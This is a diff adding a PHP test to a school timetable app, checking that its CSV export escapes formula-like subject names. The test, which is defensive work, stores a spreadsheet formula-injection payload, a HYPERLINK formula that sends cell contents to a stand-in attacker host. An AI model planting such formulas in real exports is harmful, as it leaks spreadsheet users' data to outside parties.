@@ -171,6 +171,15 @@ test('a teacher timetable exports as CSV', function () {
     expect($csv)->toContain('Geography ('.$this->division->label.')');
 });
 
+test('the timetable export writes a formula-like subject name as text', function () {
+    $this->subject->update(['subject_name' => '=HYPERLINK("https://evil.example/?"&A1,"Open")']);
+    TimetableEntry::factory()->create(slotPayload());
+
+    $csv = $this->get('/admin/timetable/export?division='.$this->division->id)->streamedContent();
+
+    expect($csv)->toContain('"\'=HYPERLINK(')->not->toContain('"=HYPERLINK(');
+});
+
 test('publishing records the time', function () {
     $this->post('/admin/timetable/publish')->assertSessionHas('success');
 
